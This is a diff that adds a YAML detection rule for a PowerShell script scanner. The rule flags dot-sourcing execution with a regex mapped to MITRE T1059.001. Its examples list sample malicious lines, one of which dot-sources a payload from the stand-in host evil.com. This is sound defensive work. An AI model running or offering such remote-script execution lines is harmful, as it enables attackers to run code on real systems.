@@ -1,0 +1,37 @@
+# PowerShell Pattern: Dot-Sourcing Execution
+# Detects script execution via dot-sourcing operator
+
+id: PS-034
+name: Dot-Sourcing Script Execution
+description: |
+  Detects use of the dot-sourcing operator (.) to execute PowerShell scripts.
+  Dot-sourcing runs a script in the current scope, making its functions and
+  variables available. Attackers use this technique to execute malicious scripts
+  while evading detection mechanisms that look for Invoke-Expression or other
+  common execution methods. This pattern identifies suspicious dot-sourcing patterns.
+languages:
+  - powershell
+detection_type: regex
+detection_logic: '(?i)\.\s+(?:\$\w+|["\x27][^"\x27]*\.ps1["\x27]|["\x27]http[^"\x27]+\.ps1["\x27]|\([^)]+\)\.ps1)'
+severity: Medium
+mitre_technique: T1059.001
+confidence: 0.75
+category: execution
+enabled: false  # Disabled: overlaps with 15+ YARA rules for T1059.001, causing score inflation
+metadata:
+  author: Script Sentinel Team
+  created: "2025-11-25"
+  updated: "2025-11-25"
+  references:
+    - "https://attack.mitre.org/techniques/T1059/001/"
+    - "https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_operators"
+  tags:
+    - powershell
+    - execution
+    - dot-sourcing
+    - script-execution
+  examples:
+    - ". $scriptPath"
+    - ". 'C:\\malicious\\payload.ps1'"
+    - ". (Get-Content script.ps1)"
+    - ". 'http://evil.com/payload.ps1'"
